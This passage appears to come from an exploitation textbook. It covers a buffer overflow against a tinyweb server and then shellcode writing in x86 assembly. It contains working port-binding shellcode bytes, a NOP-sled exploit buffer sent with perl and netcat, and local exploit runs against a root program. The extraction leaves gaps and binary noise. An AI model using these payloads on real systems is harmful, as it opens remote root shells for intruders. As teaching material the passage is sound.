see the\nGot request from 127.0.0.1:40668 \"GET /image.jpg HTTP/1.1\"\n\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u00001\u00001\u00001\u0000\u0000\u0000 j\nXQh//shh/bin\u0000\u0000Q\u0000\u0000S \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\"\nThe vulnerability certainly exists, but the shellcode doesn\u2019t do what we\nwant in this case. Since we\u2019re not at the console, shellcode is just a self-\ncontained program, designed to take over another program to open a shell.\nOnce control of the program\u2019s execution pointer is taken, the injected\nshellcode can do anything. There are many different types of shellcode\nthat can be used in different situations (or payloads). Even though not all\nshellcode actually spawns a shell, it\u2019s still commonly called shellcode.\nWhen exploiting a remote program, spawning a shell locally is pointless.\nPort-binding shellcode listens for a TCP connection on a certain port\nand serves up the shell remotely. Assuming you already have port-binding\nshellcode ready, using it is simply a matter of replacing the shellcode bytes\ndefined in the exploit. Port-binding shellcode is included in the LiveCD that\nwill bind to port 31337. These shellcode bytes are shown in the output below.\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\nreader@hacking:~/booksrc $ hexdump -C portbinding_shellcode\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10  |.jfXCRfhzifS..j.|\n00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80  |QV.....fCCSV....|\n00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f  |.fCRRV.....j.Y.?|\n00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62  |..Iy...Rh//shh/b|\n00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80              |in..R..S....|\nreader@hacking:~/booksrc $ od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\\\x/g'\n\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\n\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\n\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\n\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\n\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\nAfter some quick formatting, these bytes are swapped into the shellcode\nbytes of the tinyweb_exploit.c program, resulting in tinyweb_exploit2.c. The\n\"\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\"\n\"\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\"\n\"\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\"\n\"\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\"\n\"\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\"\n\"\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80\";\nWhen this exploit is compiled and run against a host running tinyweb\nserver, the shellcode listens on port 31337 for a TCP connection. In the\noutput below, a program called nc is used to connect to the shell. This pro-\ngram is netcat (nc for short), which works like that cat program but over the\nnetwork. We can\u2019t just use telnet to connect since it automatically terminates\nall outgoing lines with '\\r\\n'. The output of this exploit is shown below. The\n-vv command-line option passed to netcat is just to make it more verbose.\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 6a 66 58 99 | ............jfX.\n31 db 43 52 6a 01 6a 02 89 e1 cd 80 96 6a 66 58 | 1.CRj.j......jfX\n43 52 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 | CRfhzifS..j.QV..\ncd 80 b0 66 43 43 53 56 89 e1 cd 80 b0 66 43 52 | ...fCCSV.....fCR\n52 56 89 e1 cd 80 93 6a 02 59 b0 3f cd 80 49 79 | RV.....j.Y.?..Iy\nf9 b0 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 | ...Rh//shh/bin..\n52 89 e2 53 89 e1 cd 80 90 90 90 90 90 90 90 90 | R..S............\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a                                           | ..\n-rw-r--r-- 1 root root 1545 Sep  9 16:24 /etc/passwd\nEven though the remote shell doesn\u2019t display a prompt, it still accepts\nA program like netcat can be used for many other things. It\u2019s designed to\nwork like a console program, allowing standard input and output to be piped\nand redirected. Using netcat and the port-binding shellcode in a file, the same\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\nreader@hacking:~/booksrc $ echo $((540+4 - 300 - 92))\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300';\n\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000jfX\u00001\u0000CRj j \u0000\u0000 \u0000jfXC\nRfhzifS\u0000\u0000j QV\u0000\u0000 \u0000fCCSV\u0000\u0000 \u0000fCRRV\u0000\u0000 \u0000j Y\u0000? Iy\u0000\u0000Rh//shh/bin\u0000\u0000R\u0000\u0000S\u0000\u0000 \u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\n\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0002\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300'; cat portbinding_shellcode;\nperl -e 'print \"\\x88\\xf6\\xff\\xbf\"x38 . \"\\r\\n\"') | nc -v -w1 127.0.0.1 80\nIn the output above, first the length of the port-binding shellcode is\nshown to be 92 bytes. The return address is found 540 bytes from the start of\nthe buffer, so with a 300-byte NOP sled and 92 bytes of shellcode, there are\n152 bytes to the return address overwrite. This means that if the target return\naddress is repeated 38 times at the end of the buffer, the last one should do\nthe overwrite. Finally, the buffer is terminated with '\\r\\n'. The commands\nthat build the buffer are grouped with parentheses to pipe the buffer into\nnetcat. netcat connects to the tinyweb program and sends the buffer. After\nthe shellcode runs, netcat needs to be broken out of by pressing CTRL-C,\nsince the original socket connection is still open. Then, netcat is used again\nSo far, the shellcode used in our exploits has been\njust a string of copied and pasted bytes. We have seen\nstandard shell-spawning shellcode for local exploits\nand port-binding shellcode for remote ones. Shellcode\nis also sometimes referred to as an exploit payload, since these self-contained\nprograms do the real work once a program has been hacked. Shellcode usually\nspawns a shell, as that is an elegant way to hand off control; but it can do any-\nUnfortunately, for many hackers the shellcode story stops at copying and\npasting bytes. These hackers are just scratching the surface of what\u2019s possible.\nCustom shellcode gives you absolute control over the exploited program.\nPerhaps you want your shellcode to add an admin account to /etc/passwd\nor to automatically remove lines from log files. Once you know how to write\nyour own shellcode, your exploits are limited only by your imagination. In\naddition, writing shellcode develops assembly language skills and employs a\nThe shellcode bytes are actually architecture-specific machine instructions,\nso shellcode is written using the assembly language. Writing a program in\nassembly is different than writing it in C, but many of the principles are similar.\nThe operating system manages things like input, output, process control, file\naccess, and network communication in the kernel. Compiled C programs\nultimately perform these tasks by making system calls to the kernel. Different\noperating systems have different sets of system calls.\nIn C, standard libraries are used for convenience and portability. A C pro-\ngram that uses printf() to output a string can be compiled for many different\nsystems, since the library knows the appropriate system calls for various archi-\ntectures. A C program compiled on an x86 processor will produce x86 assembly\nBy definition, assembly language is already specific to a certain processor\narchitecture, so portability is impossible. There are no standard libraries;\ninstead, kernel system calls have to be made directly. To begin our comparison,\nlet\u2019s write a simple C program, then rewrite it in x86 assembly.\nWhen the compiled program is run, execution flows through the standard\nI/O library, eventually making a system call to write the string Hello, world! to\nthe screen. The strace program is used to trace a program\u2019s system calls. Used\non the compiled helloworld program, it shows every system call that program\nexecve(\"./a.out\", [\"./a.out\"], [/* 27 vars */]) = 0\nbrk(0)                                  = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nfstat64(3, {st_mode=S_IFREG|0644, st_size=61323, ...}) = 0\nmmap2(NULL, 61323, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ee7000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\20Z\\1\\000\"..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1248904, ...}) = 0\nmmap2(NULL, 1258876, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7db3000\nmmap2(0xb7ee0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x12c) =\nmmap2(0xb7ee4000, 9596, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef5000\nAs you can see, the compiled program does more than just print a string.\nThe system calls at the start are setting up the environment and memory\nfor the program, but the important part is the write() syscall shown in bold.\nThe Unix manual pages (accessed with the man command) are sep-\narated into sections. Section 2 contains the manual pages for system calls,\nso man 2 write will describe the use of the write() system call:\nWRITE(2)                   Linux Programmer's Manual\nssize_t write(int fd, const void *buf, size_t count);\nwrite() writes up to count bytes to the file referenced by the file\ndescriptor fd from the buffer starting at buf. POSIX  requires  that a\nread() which can be proved to occur after a write() returns the new\ndata. Note that not all file systems are POSIX conforming.\nThe strace output also shows the arguments for the syscall. The buf\nand count arguments are a pointer to our string and its length. The fd\nargument of 1 is a special standard file descriptor. File descriptors are used\nfor almost everything in Unix: input, output, file access, network sockets,\nand so on. A file descriptor is similar to a number given out at a coat check.\nOpening a file descriptor is like checking in your coat, since you are given\na number that can later be used to reference your coat. The first three file\ndescriptor numbers (0, 1, and 2) are automatically used for standard input,\noutput, and error. These values are standard and have been defined in several\nplaces, such as the /usr/include/unistd.h file on the following page.\n#define STDERR_FILENO 2 /* Standard error output.  */\nWriting bytes to standard output\u2019s file descriptor of 1 will print the bytes;\nreading from standard input\u2019s file descriptor of 0 will input bytes. The standard\nerror file descriptor of 2 is used to display the error or debugging messages\nEvery possible Linux system call is enumerated, so they can be referenced\nby numbers when making the calls in assembly. These syscalls are listed in\nFor our rewrite of helloworld.c in assembly, we will make a system call to\nthe write() function for the output and then a second system call to exit()\nso the process quits cleanly. This can be done in x86 assembly using just two\nAssembly instructions for the x86 processor have one, two, three, or no\noperands. The operands to an instruction can be numerical values, memory\naddresses, or processor registers. The x86 processor has several 32-bit registers\nthat can be viewed as hardware variables. The registers EAX, EBX, ECX, EDX,\nESI, EDI, EBP, and ESP can all be used as operands, while the EIP register\nThe mov instruction copies a value between its two operands. Using Intel\nassembly syntax, the first operand is the destination and the second is the\nsource. The int instruction sends an interrupt signal to the kernel, defined\nby its single operand. With the Linux kernel, interrupt 0x80 is used to tell\nthe kernel to make a system call. When the int 0x80 instruction is executed, the\nkernel will make a system call based on the first four registers. The EAX register\nis used to specify which system call to make, while the EBX, ECX, and EDX\nregisters are used to hold the first, second, and third arguments to the system\ncall. All of these registers can be set using the mov instruction.\nIn the following assembly code listing, the memory segments are simply\ndeclared. The string \"Hello, world!\" with a newline character (0x0a) is in the\ndata segment, and the actual assembly instructions are in the text segment.\nmsg     db      \"Hello, world!\", 0x0a   ; The string and newline char\nglobal _start       ; Default entry point for ELF linking\nmov eax, 4        ; Put 4 into eax, since write is syscall #4.\nmov ebx, 1        ; Put 1 into ebx, since stdout is 1.\nmov ecx, msg      ; Put the address of the string into ecx.\nmov edx, 14       ; Put 14 into edx, since our string is 14 bytes.\nint 0x80          ; Call the kernel to make the system call happen.\nmov eax, 1        ; Put 1 into eax, since exit is syscall #1.\nThe instructions of this program are straightforward. For the write() syscall\nto standard output, the value of 4 is put in EAX since the write() function is\nsystem call number 4. Then, the value of 1 is put into EBX, since the first arg-\nument of write() should be the file descriptor for standard output. Next, the\naddress of the string in the data segment is put into ECX, and the length of the\nstring (in this case, 14 bytes) is put into EDX. After these registers are loaded,\nthe system call interrupt is triggered, which will call the write() function.\nTo exit cleanly, the exit() function needs to be called with a single\nargument of 0. So the value of 1 is put into EAX, since exit() is system call\nnumber 1, and the value of 0 is put into EBX, since the first and only argu-\nment should be 0. Then the system call interrupt is triggered again.\nTo create an executable binary, this assembly code must first be assembled\nand then linked into an executable format. When compiling C code, the GCC\ncompiler takes care of all of this automatically. We are going to create an\nexecutable and linking format (ELF) binary, so the global _start line shows\nThe nasm assembler with the -f elf argument will assemble the\nhelloworld.asm into an object file ready to be linked as an ELF binary.\nBy default, this object file will be called helloworld.o. The linker program\nld will produce an executable a.out binary from the assembled object.\nreader@hacking:~/booksrc $ nasm -f elf helloworld.asm\nThis tiny program works, but it\u2019s not shellcode, since it isn\u2019t self-contained\nShellcode is literally injected into a running program, where it takes over like\na biological virus inside a cell. Since shellcode isn\u2019t really an executable pro-\ngram, we don\u2019t have the luxury of declaring the layout of data in memory or\neven using other memory segments. Our instructions must be self-contained\nand ready to take over control of the processor regardless of its current state.\nThis is commonly referred to as position-independent code.\nIn shellcode, the bytes for the string \"Hello, world!\" must be mixed\ntogether with the bytes for the assembly instructions, since there aren\u2019t\ndefinable or predictable memory segments. This is fine as long as EIP doesn\u2019t\ntry to interpret the string as instructions. However, to access the string as data\nwe need a pointer to it. When the shellcode gets executed, it could be any-\nwhere in memory. The string\u2019s absolute memory address needs to be calcu-\nlated relative to EIP. Since EIP cannot be accessed from assembly instructions,\nThe stack is so integral to the x86 architecture that there are special instruc-\nStack-based exploits are made possible by the call and ret instructions.\nWhen a function is called, the return address of the next instruction is pushed\nto the stack, beginning the stack frame. After the function is finished, the ret\ninstruction pops the return address from the stack and jumps EIP back there.\nBy overwriting the stored return address on the stack before the ret instruc-\ntion, we can take control of a program\u2019s execution.\nThis architecture can be misused in another way to solve the problem of\naddressing the inline string data. If the string is placed directly after a call\ninstruction, the address of the string will get pushed to the stack as the return\naddress. Instead of calling a function, we can jump past the string to a pop\ninstruction that will take the address off the stack and into a register. The\nfollowing assembly instructions demonstrate this technique.\nBITS 32             ; Tell nasm this is 32-bit code.\ncall mark_below   ; Call below the string to instructions\ndb \"Hello, world!\", 0x0a, 0x0d  ; with newline and carriage return bytes.\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx           ; Pop the return address (string ptr) into ecx.\nPop a value from the stack and store in the destination operand.\nCall a function, jumping the execution to the address in the location\noperand. This location can be relative or absolute. The address of the\ninstruction following the call is pushed to the stack, so that execution can\nReturn from a function, popping the return address from the stack and\nint 0x80          ; Do syscall: write(1, string, 14)\nThe call instruction jumps execution down below the string. This also\npushes the address of the next instruction to the stack, the next instruction\nin our case being the beginning of the string. The return address can imme-\ndiately be popped from the stack into the appropriate register. Without using\nany memory segments, these raw instructions, injected into an existing process,\nwill execute in a completely position-independent way. This means that, when\nthese instructions are assembled, they cannot be linked into an executable.\n-rw-r--r-- 1 reader reader 50 2007-10-26 08:30 helloworld1\n00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|\n00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|\n00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|\n00000030  cd 80                                             |..|\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\nThe nasm assembler converts assembly language into machine code and\na corresponding tool called ndisasm converts machine code into assembly.\nThese tools are used above to show the relationship between the machine\ncode bytes and the assembly instructions. The disassembly instructions marked\nin bold are the bytes of the \"Hello, world!\" string interpreted as instructions.\nNow, if we can inject this shellcode into a program and redirect EIP, the\nprogram will print out Hello, world! Let\u2019s use the familiar exploit target of the\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc6\\xf9\\xff\\xbf\"x40')\nFailure. Why do you think it crashed? In situations like this, GDB is your\nbest friend. Even if you already know the reason behind this specific crash,\nlearning how to effectively use a debugger will help you solve many other\nSince the notesearch program runs as root, we can\u2019t debug it as a normal\nuser. However, we also can\u2019t just attach to a running copy of it, because it\nexits too quickly. Another way to debug programs is with core dumps. From a\nroot prompt, the OS can be told to dump memory when the program crashes\nby using the command ulimit -c unlimited. This means that dumped core\nfiles are allowed to get as big as needed. Now, when the program crashes,\nthe memory will be dumped to disk as a core file, which can be examined\nroot@hacking:/home/reader/booksrc # ulimit -c unlimited\nroot@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1)\nroot@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch\nroot@hacking:/home/reader/booksrc # ./notesearch $(perl -e 'print \"\\xa3\\xf9\\\n-rw------- 1 root root 147456 2007-10-26 08:36 ./core\nroot@hacking:/home/reader/booksrc # gdb -q -c ./core\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E\u00bf\u00a3\u00b0E.\nProgram terminated with signal 11, Segmentation fault.\n0xbffff9a3:     0xe8    0x0f    0x48    0x65    0x6c    0x6c    0x6f    0x2c\n0xbffff9ab:     0x20    0x77    0x6f    0x72    0x6c    0x64    0x21    0x0a\n0xbffff9b3:     0x0d    0x59    0xb8    0x04    0xbb    0x01    0xba    0x0f\n0xbffff9bb:     0xcd    0x80    0xb8    0x01    0xbb    0xcd    0x80    0x00\nroot@hacking:/home/reader/booksrc # hexdump -C helloworld1\n00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|\n00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|\n00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|\n00000030  cd 80                                             |..|\nOnce GDB is loaded, the disassembly style is switched to Intel. Since we\nare running GDB as root, the .gdbinit file won\u2019t be used. The memory where\nthe shellcode should be is examined. The instructions look incorrect, but it\nseems like the first incorrect call instruction is what caused the crash. At least,\nexecution was redirected, but something went wrong with the shellcode bytes.\nNormally, strings are terminated by a null byte, but here, the shell was kind\nenough to remove these null bytes for us. This, however, totally destroys the\nmeaning of the machine code. Often, shellcode will be injected into a process\nas a string, using functions like strcpy(). Such functions will simply terminate\nat the first null byte, producing incomplete and unusable shellcode in mem-\nory. In order for the shellcode to survive transit, it must be redesigned so it\nLooking at the disassembly, it is obvious that the first null bytes come from\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\nThis instruction jumps execution forward by 19 (0x13) bytes, based on the\nfirst operand. The call instruction allows for much longer jump distances,\nwhich means that a small value like 19 will have to be padded with leading\nOne way around this problem takes advantage of two\u2019s complement. A\nsmall negative number will have its leading bits turned on, resulting in 0xff\nbytes. This means that, if we call using a negative value to move backward in\nexecution, the machine code for that instruction won\u2019t have any null bytes.\nThe following revision of the helloworld shellcode uses a standard implemen-\ntation of this trick: Jump to the end of the shellcode to a call instruction which,\nin turn, will jump back to a pop instruction at the beginning of the shellcode.\nBITS 32             ; Tell nasm this is 32-bit code.\njmp short one       ; Jump down to a call at the end.\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx           ; Pop the return address (string ptr) into ecx.\nint 0x80          ; Do syscall: write(1, string, 14)\ndb \"Hello, world!\", 0x0a, 0x0d  ; with newline and carriage return bytes.\nAfter assembling this new shellcode, disassembly shows that the call\ninstruction (shown in italics below) is now free of null bytes. This solves the\nfirst and most difficult null-byte problem for this shellcode, but there are still\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld2\nThese remaining null bytes can be eliminated with an understanding of\nregister widths and addressing. Notice that the first jmp instruction is actually\njmp short. This means execution can only jump a maximum of approximately\n128 bytes in either direction. The normal jmp instruction, as well as the call\ninstruction (which has no short version), allows for much longer jumps. The\ndifference between assembled machine code for the two jump varieties is\nThe EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits\nin width. The E stands for extended, because these were originally 16-bit reg-\nisters called AX, BX, CX, DX, SI, DI, BP, and SP. These original 16-bit versions\nof the registers can still be used for accessing the first 16 bits of each corre-\nsponding 32-bit register. Furthermore, the individual bytes of the AX, BX, CX,\nand DX registers can be accessed as 8-bit registers called AL, AH, BL, BH, CL,\nCH, DL, and DH, where L stands for low byte and H for high byte. Naturally,\nassembly instructions using the smaller registers only need to specify operands\nup to the register\u2019s bit width. The three variations of a mov instruction are\nUsing the AL, BL, CL, or DL register will put the correct least significant\nbyte into the corresponding extended register without creating any null bytes\nin the machine code. However, the top three bytes of the register could still\ncontain anything. This is especially true for shellcode, since it will be taking\nover another process. If we want the 32-bit register values to be correct, we\nneed to zero out the entire register before the mov instructions\u2014but this, again,\nmust be done without using null bytes. Here are some more simple assembly\ninstructions for your arsenal. These first two are small instructions that incre-\nThe next few instructions, like the mov instruction, have two operands.\nThey all do simple arithmetic and bitwise 